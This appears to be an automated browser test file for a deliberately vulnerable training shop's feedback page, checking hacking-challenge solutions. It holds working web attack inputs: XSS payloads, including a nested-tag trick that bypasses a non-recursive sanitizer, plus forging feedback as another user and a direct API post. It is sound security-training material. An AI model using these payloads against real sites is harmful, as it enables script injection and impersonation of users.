const config = require('config')

describe('/#/contact', () => {
  let comment, rating, submitButton

  protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

  beforeEach(() => {
    browser.get('/#/contact')
    comment = element(by.model('feedback.comment'))
    rating = element(by.model('feedback.rating'))
    submitButton = element(by.id('submitButton'))
  })

  describe('challenge "forgedFeedback"', () => {
    it('should be possible to provide feedback as another user', () => {
      browser.executeScript('document.getElementById("userId").removeAttribute("ng-hide");')
      browser.executeScript('document.getElementById("userId").removeAttribute("class");')

      const UserId = element(by.model('feedback.UserId'))
      UserId.clear()
      UserId.sendKeys('2')
      comment.sendKeys('Picard stinks!')
      rating.click()

      submitButton.click()

      browser.get('/#/administration')
      const feedbackUserId = element.all(by.repeater('feedback in feedbacks').column('UserId'))
      expect(feedbackUserId.last().getText()).toMatch('2')
    })

    protractor.expect.challengeSolved({ challenge: 'Forged Feedback' })
  })

  it('should sanitize script from comments to remove potentially malicious html', () => {
    comment.sendKeys('Sani<script>alert("ScriptXSS")</script>tizedScript')
    rating.click()

    submitButton.click()

    expectPersistedCommentToMatch(/SanitizedScript/)
  })

  it('should sanitize image from comments to remove potentially malicious html', () => {
    comment.sendKeys('Sani<img src="alert("ImageXSS")"/>tizedImage')
    rating.click()

    submitButton.click()

    expectPersistedCommentToMatch(/SanitizedImage/)
  })

  it('should sanitize iframe from comments to remove potentially malicious html', () => {
    comment.sendKeys('Sani<iframe src="alert("IFrameXSS")"></iframe>tizedIFrame')
    rating.click()

    submitButton.click()

    expectPersistedCommentToMatch(/SanitizedIFrame/)
  })

  describe('challenge "xss4"', () => {
    it('should be possible to trick the sanitization with a masked XSS attack', () => {
      const EC = protractor.ExpectedConditions

      comment.sendKeys('<<script>Foo</script>script>alert("XSS4")<</script>/script>')
      rating.click()

      submitButton.click()

      browser.get('/#/about')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS4' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('XSS4')
        alert.accept()
      })

      browser.get('/#/administration')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS4' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('XSS4')
        alert.accept()
        element.all(by.repeater('feedback in feedbacks')).last().element(by.css('.fa-trash')).click()
      })
    })

    protractor.expect.challengeSolved({ challenge: 'XSS Tier 4' })
  })

  describe('challenge "vulnerableComponent"', () => {
    it('should be possible to post known vulnerable component(s) as feedback', () => {
      comment.sendKeys('sanitize-html 1.4.2 is non-recursive.')
      comment.sendKeys('express-jwt 0.1.3 has broken crypto.')
      rating.click()

      submitButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Vulnerable Library' })
  })

  describe('challenge "weirdCrypto"', () => {
    it('should be possible to post weird crypto algorithm/library as feedback', () => {
      comment.sendKeys('The following libraries are bad for crypto: z85, base85, md5 and hashids')
      rating.click()

      submitButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Weird Crypto' })
  })

  describe('challenge "typosquattingNpm"', () => {
    it('should be possible to post typosquatting NPM package as feedback', () => {
      comment.sendKeys('You are a typosquatting victim of this NPM package: epilogue-js')
      rating.click()

      submitButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Typosquatting Tier 1' })
  })

  describe('challenge "typosquattingBower"', () => {
    it('should be possible to post typosquatting Bower package as feedback', () => {
      comment.sendKeys('You are a typosquatting victim of this Bower package: angular-tooltipps')
      rating.click()

      submitButton.click()
    })

    protractor.expect.challengeSolved({ challenge: 'Typosquatting Tier 2' })
  })

  describe('challenge "zeroStars"', () => {
    it('should be possible to post feedback with zero stars by clicking rating twice', () => {
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/api/Feedbacks\', {comment: \'This is the worst shop I have ever been to!\', rating: 0});')
    })

    protractor.expect.challengeSolved({ challenge: 'Zero Stars' })
  })
})

function expectPersistedCommentToMatch (expectation) {
  browser.get('/#/administration')
  const feedbackComments = element.all(by.repeater('feedback in feedbacks').column('comment'))
  expect(feedbackComments.last().getText()).toMatch(expectation)
}
